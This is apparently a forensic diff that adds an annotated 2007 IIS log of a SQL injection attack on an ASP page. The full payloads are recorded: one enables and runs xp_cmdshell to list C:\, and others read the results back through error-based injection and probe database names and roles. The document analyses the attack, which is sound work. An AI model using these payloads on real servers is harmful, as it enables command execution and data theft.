@@ -1,0 +1,76 @@
+# Proceso de ataque:
+# -----------------
+# CREATE%20TABLE%20[X_5031]
+# insert%20into%20[X_5031] exec%20master.dbo.xp_cmdshell%20'Dir%20C:\';
+#       |-> insert%20into%20[X_5031]%20values%20('g_over');
+# exec%20master.dbo.sp_dropextendedproc%20'xp_cmdshell
+#
+# Extraccion:
+# ----------
+# _Volume_in_drive_C_is_SYSTEM|
+# _Volume_Serial_Number_is_24CA-C152|
+# |
+# _Directory_of_C:\|
+# |
+# 21/07/2006__04:59p______<DIR>__________ca_lic|
+# 22/01/2007__06:26p______<DIR>__________Documents_and_Settings|
+# 14/07/2006__09:12p______<DIR>__________drv|
+# 30/08/2006__11:46a______<DIR>__________Inetpub|
+# _______________9_Dir(s)___3.701.329.920_bytes_free|
+#
+#
+#
+
+
+#Ataque3 Inicio ##########################################################################################
+
+
+2007-08-04 22:07:36 125.34.250.23 - 192.168.204.25 80 GET /estructura_detalle_neo_data.asp intIdS=13&intId=1628';CREATE%20TABLE%20[X_5031]([id]%20int%20NOT%20NULL%20IDENTITY%20(1,1),%20[ResultTxt]%20nvarchar(4000)%20NULL);insert%20into%20[X_5031](ResultTxt)%20exec%20master.dbo.xp_cmdshell%20'Dir%20C:\';insert%20into%20[X_5031]%20values%20('g_over');exec%20master.dbo.sp_dropextendedproc%20'xp_cmdshell'-- 200 0 Mozilla/4.0+(compatible;+MSIE+6.0;+Windows+98;+.NET+CLR+1.1.4322) SITESERVER=ID=63551227df0420c63e76e037fc99c123;+ASPSESSIONIDSCDSQBDS=LJOPEBDCNFAJAGCJBJKJHMLB http://www.gongdiscos.com/ficha_discos.asp?cod=658896
+
+#--------------------
+
+2007-08-04 22:07:37 125.34.250.23 - 192.168.204.25 80 GET /estructura_detalle_neo_data.asp intIdS=13&intId=1628';
+use%20master%20dbcc%20addextendedproc('xp_cmdshell','xplog70.dll')-- 200 0 Mozilla/4.0+(compatible;+MSIE+6.0;+Windows+98;+.NET+CLR+1.1.4322) SITESERVER=ID=63551227df0420c63e76e037fc99c123;+ASPSESSIONIDSCDSQBDS=LJOPEBDCNFAJAGCJBJKJHMLB http://www.gongdiscos.com/ficha_discos.asp?cod=658896 
+
+2007-08-04 22:07:37 190.30.244.30 - 192.168.204.25 80 GET /swf/ban_cuidar500x80.swf id=005 304 187 Mozilla/4.0+(compatible;+MSIE+6.0;+Windows+NT+5.1;+SV1) SITESERVER=ID=b8c52a6f54cb950f3ea11b1129907229;+ASPSESSIONIDSCDSQBDS=DJOPEBDCJJCFDAPOLPKPMCJB -
+
+#----------------------
+
+2007-08-04 22:07:39 125.34.250.23 - 192.168.204.25 80 GET /estructura_detalle_neo_data.asp intIdS=13&intId=1628'%
+20And%20(Select%20Top%201%20CASE%20WHEN%20ResultTxt%20is%20Null%20then%20char(124)%20else%20ResultTxt%2Bchar(124)%20End%20from%20(Select%20Top%201%20id,ResultTxt%20from%20[X_5031]%20order%20by%20[id])%20T%20order%20by%20[id]%20desc)>0--|36|80040e07|Syntax_error_converting_the_nvarchar_value_'JM_Volume_in_drive_C_is_SYSTEM|'_to_a_column_of_data_type_int. 500 0 Mozilla/4.0+(compatible;+MSIE+6.0;+Windows+98;+.NET+CLR+1.1.4322) SITESERVER=ID=63551227df04
+20c63e76e037fc99c123;+ASPSESSIONIDSCDSQBDS=LJOPEBDCNFAJAGCJBJKJHMLB http://www.gongdiscos.com/ficha_discos.asp?cod=658896
+
+2007-08-04 22:07:39 125.34.250.23 - 192.168.204.25 80 GET /estructura_detalle_neo_data.asp intIdS=13&intId=1628'%20And%20(Select%20Top%201%20CASE%20WHEN%20ResultTxt%20is%20Null%20then%20char(124)%20else%20ResultTxt%2Bchar(124)%20End%20from%20(Select%20Top%202%20id,ResultTxt%20from%20[X_5031]%20order%20by%20[id])%20T%20order%20by%20[id]%20desc)>0--|36|80040e07|Syntax_error_converting_the_nvarchar_value_'_Volume_Serial_Number_is_24CA-C152|'_to_a_column_of_data_type_int. 500 0 Mozilla/4.0+(compatible;+MSIE+6.0;+Windows+98;+.NET+CLR+1.1.4322) SITESERVER=ID=63551227df0420c63e76e037fc99c123;+ASPSESSIONIDSCDSQBDS=LJOPEBDCNFAJAGCJBJKJHMLB http://www.gongdiscos.com/ficha_discos.asp?cod=658896
+
+2007-08-04 22:07:40 125.34.250.23 - 192.168.204.25 80 GET /estructura_detalle_neo_data.asp intIdS=13&intId=1628'%20And%20(Select%20Top%201%20CASE%20WHEN%20ResultTxt%20is%20Null%20then%20char(124)%20else%20ResultTxt%2Bchar(124)%20End%20from%20(Select%20Top%203%20id,ResultTxt%20from%20[X_5031]%20order%20by%20[id])%20T%20order%20by%20[id]%20desc)>0--|36|80040e07|Syntax_error_converting_the_nvarchar_value_'|'_to_a_column_of_data_type_int. 500 0 Mozilla/4.0+(compatible;+MSIE+6.0;+Windows+98;+.NET+CLR+1.1.4322) SITESERVER=ID=63551227df0420c63e76e037fc99c123;+ASPSESSIONIDSCDSQBDS=LJOPEBDCNFAJAGCJBJKJHMLB http://www.gongdiscos.com/ficha_discos.asp?cod=658896
+
+2007-08-04 22:07:40 125.34.250.23 - 192.168.204.25 80 GET /estructura_detalle_neo_data.asp intIdS=13&intId=1628'%20And%20(Select%20Top%201%20CASE%20WHEN%20ResultTxt%20is%20Null%20then%20char(124)%20else%20ResultTxt%2Bchar(124)%20End%20from%20(Select%20Top%204%20id,ResultTxt%20from%20[X_5031]%20order%20by%20[id])%20T%20order%20by%20[id]%20desc)>0--|36|80040e07|Syntax_error_converting_the_nvarchar_value_'_Directory_of_C:\|'_to_a_column_of_data_type_int. 500 0 Mozilla/4.0+(compatible;+MSIE+6.0;+Windows+98;+.NET+CLR+1.1.4322) SITESERVER=ID=63551227df0420c63e76e037fc99c123;+ASPSESSIONIDSCDSQBDS=LJOPEBDCNFAJAGCJBJKJHMLB http://www.gongdiscos.com/ficha_discos.asp?cod=658896
+
+2007-08-04 22:07:41 125.34.250.23 - 192.168.204.25 80 GET /estructura_detalle_neo_data.asp intIdS=13&intId=1628'%20And%20(Select%20Top%201%20CASE%20WHEN%20ResultTxt%20is%20Null%20then%20char(124)%20else%20ResultTxt%2Bchar(124)%20End%20from%20(Select%20Top%205%20id,ResultTxt%20from%20[X_5031]%20order%20by%20[id])%20T%20order%20by%20[id]%20desc)>0--|36|80040e07|Syntax_error_converting_the_nvarchar_value_'|'_to_a_column_of_data_type_int. 500 0 Mozilla/4.0+(compatible;+MSIE+6.0;+Windows+98;+.NET+CLR+1.1.4322) SITESERVER=ID=63551227df0420c63e76e037fc99c123;+ASPSESSIONIDSCDSQBDS=LJOPEBDCNFAJAGCJBJKJHMLB http://www.gongdiscos.com/ficha_discos.asp?cod=658896
+
+2007-08-04 22:07:41 125.34.250.23 - 192.168.204.25 80 GET /estructura_detalle_neo_data.asp intIdS=13&intId=1628'%20And%20(Select%20Top%201%20CASE%20WHEN%20ResultTxt%20is%20Null%20then%20char(124)%20else%20ResultTxt%2Bchar(124)%20End%20from%20(Select%20Top%206%20id,ResultTxt%20from%20[X_5031]%20order%20by%20[id])%20T%20order%20by%20[id]%20desc)>0--|36|80040e07|Syntax_error_converting_the_nvarchar_value_'21/07/2006__04:59p______<DIR>__________ca_lic|'_to_a_column_of_data_type_int. 500 0 Mozilla/4.0+(compatible;+MSIE+6.0;+Windows+98;+.NET+CLR+1.1.4322) SITESERVER=ID=63551227df0420c63e76e037fc99c123;+ASPSESSIONIDSCDSQBDS=LJOPEBDCNFAJAGCJBJKJHMLB http://www.gongdiscos.com/ficha_discos.asp?cod=658896
+
+2007-08-04 22:07:42 125.34.250.23 - 192.168.204.25 80 GET /estructura_detalle_neo_data.asp intIdS=13&intId=1628'%20And%20(Select%20Top%201%20CASE%20WHEN%20ResultTxt%20is%20Null%20then%20char(124)%20else%20ResultTxt%2Bchar(124)%20End%20from%20(Select%20Top%207%20id,ResultTxt%20from%20[X_5031]%20order%20by%20[id])%20T%20order%20by%20[id]%20desc)>0--|36|80040e07|Syntax_error_converting_the_nvarchar_value_'22/01/2007__06:26p______<DIR>__________Documents_and_Settings|'_to_a_column_of_data_type_int. 500 0 Mozilla/4.0+(compatible;+MSIE+6.0;+Windows+98;+.NET+CLR+1.1.4322) SITESERVER=ID=63551227df0420c63e76e037fc99c123;+ASPSESSIONIDSCDSQBDS=LJOPEBDCNFAJAGCJBJKJHMLB http://www.gongdiscos.com/ficha_discos.asp?cod=658896
+
+2007-08-04 22:07:42 125.34.250.23 - 192.168.204.25 80 GET /estructura_detalle_neo_data.asp intIdS=13&intId=1628'%20And%20(Select%20Top%201%20CASE%20WHEN%20ResultTxt%20is%20Null%20then%20char(124)%20else%20ResultTxt%2Bchar(124)%20End%20from%20(Select%20Top%208%20id,ResultTxt%20from%20[X_5031]%20order%20by%20[id])%20T%20order%20by%20[id]%20desc)>0--|36|80040e07|Syntax_error_converting_the_nvarchar_value_'14/07/2006__09:12p______<DIR>__________drv|'_to_a_column_of_data_type_int. 500 0 Mozilla/4.0+(compatible;+MSIE+6.0;+Windows+98;+.NET+CLR+1.1.4322) SITESERVER=ID=63551227df0420c63e76e037fc99c123;+ASPSESSIONIDSCDSQBDS=LJOPEBDCNFAJAGCJBJKJHMLB http://www.gongdiscos.com/ficha_discos.asp?cod=658896
+
+2007-08-04 22:07:44 125.34.250.23 - 192.168.204.25 80 GET /estructura_detalle_neo_data.asp intIdS=13&intId=1628'%20And%20(Select%20Top%201%20CASE%20WHEN%20ResultTxt%20is%20Null%20then%20char(124)%20else%20ResultTxt%2Bchar(124)%20End%20from%20(Select%20Top%209%20id,ResultTxt%20from%20[X_5031]%20order%20by%20[id])%20T%20order%20by%20[id]%20desc)>0--|36|80040e07|Syntax_error_converting_the_nvarchar_value_'30/08/2006__11:46a______<DIR>__________Inetpub|'_to_a_column_of_data_type_int. 500 0 Mozilla/4.0+(compatible;+MSIE+6.0;+Windows+98;+.NET+CLR+1.1.4322) SITESERVER=ID=63551227df0420c63e76e037fc99c123;+ASPSESSIONIDSCDSQBDS=LJOPEBDCNFAJAGCJBJKJHMLB http://www.gongdiscos.com/ficha_discos.asp?cod=658896
+
+2007-08-04 22:07:48 125.34.250.23 - 192.168.204.25 80 GET /estructura_detalle_neo_data.asp intIdS=13&intId=1628'%20And%20(Select%20Top%201%20CASE%20WHEN%20ResultTxt%20is%20Null%20then%20char(124)%20else%20ResultTxt%2Bchar(124)%20End%20from%20(Select%20Top%2017%20id,ResultTxt%20from%20[X_5031]%20order%20by%20[id])%20T%20order%20by%20[id]%20desc)>0--|36|80040e07|Syntax_error_converting_the_nvarchar_value_'_______________9_Dir(s)___3.701.329.920_bytes_free|'_to_a_column_of_data_type_int. 500 0 Mozilla/4.0+(compatible;+MSIE+6.0;+Windows+98;+.NET+CLR+1.1.4322) SITESERVER=ID=63551227df0420c63e76e037fc99c123;+ASPSESSIONIDSCDSQBDS=LJOPEBDCNFAJAGCJBJKJHMLB http://www.gongdiscos.com/ficha_discos.asp?cod=658896
+
+
+#Ataque3 Finalizado ##########################################################################################
+
+
+2007-08-04 22:06:59 125.34.250.23 - 192.168.204.25 80 GET /estructura_detalle_neo_data.asp intIdS=13&intId=1628'%20And%20Cast(IS_MEMBER(0x640062005F006F0077006E0065007200)%20as%20nvarchar(1))%2Bchar(124)=1%20And%20''='|36|80040e07|Syntax_error_converting_the_nvarchar_value_'1|'_to_a_column_of_data_type_int. 500 0 Mozilla/4.0+(compatible;+MSIE+6.0;+Windows+98;+.NET+CLR+1.1.4322) SITESERVER=ID=63551227df0420c63e76e037fc99c123;+ASPSESSIONIDSCDSQBDS=LJOPEBDCNFAJAGCJBJKJHMLB http://www.gongdiscos.com/ficha_discos.asp?cod=658896
+
+2007-08-04 22:07:00 125.34.250.23 - 192.168.204.25 80 GET /estructura_detalle_neo_data.asp intIdS=13&intId=1628'%20And%20db_name()%2Bchar(124)=0%20And%20''='|36|80040e07|Syntax_error_converting_the_nvarchar_value_'OSDE_NEO_V3|'_to_a_column_of_data_type_int. 500 0 Mozilla/4.0+(compatible;+MSIE+6.0;+Windows+98;+.NET+CLR+1.1.4322) SITESERVER=ID=63551227df0420c63e76e037fc99c123;+ASPSESSIONIDSCDSQBDS=LJOPEBDCNFAJAGCJBJKJHMLB http://www.gongdiscos.com/ficha_discos.asp?cod=658896
+
+2007-08-04 22:07:00 125.34.250.23 - 192.168.204.25 80 GET /estructura_detalle_neo_data.asp intIdS=13&intId=1628';declare%20@a%20int-- 200 0 Mozilla/4.0+(compatible;+MSIE+6.0;+Windows+98;+.NET+CLR+1.1.4322) SITESERVER=ID=63551227df0420c63e76e037fc99c123;+ASPSESSIONIDSCDSQBDS=LJOPEBDCNFAJAGCJBJKJHMLB http://www.gongdiscos.com/ficha_discos.asp?cod=658896
+
+2007-08-04 22:07:36 190.30.244.30 - 192.168.204.25 80 GET /Default.asp - 302 0 Mozilla/4.0+(compatible;+MSIE+6.0;
++Windows+NT+5.1;+SV1) SITESERVER=ID=b8c52a6f54cb950f3ea11b1129907229;+ASPSESSIONIDSCDSQBDS=DJOPEBDCJJCFDAPOLPKPMCJB http://www.osdeneo.com.ar/planes.asp?idMod=15&idSubMod=14
+
+2007-08-04 22:07:36 190.30.244.30 - 192.168.204.25 80 GET /home.asp - 200 0 Mozilla/4.0+(compatible;+MSIE+6.0;+Windows+NT+5.1;+SV1) SITESERVER=ID=b8c52a6f54cb950f3ea11b1129907229;+ASPSESSIONIDSCDSQBDS=DJOPEBDCJJCFDAPOLPKPMCJB http://www.osdeneo.com.ar/planes.asp?idMod=15&idSubMod=14
+
+2007-08-04 22:07:36 190.30.244.30 - 192.168.204.25 80 GET /swf/tap.swf 1 304 188 Mozilla/4.0+(compatible;+MSIE+6.0;+Windows+NT+5.1;+SV1) SITESERVER=ID=b8c52a6f54cb950f3ea11b1129907229;+ASPSESSIONIDSCDSQBDS=DJOPEBDCJJCFDAPOLPKPMCJB -
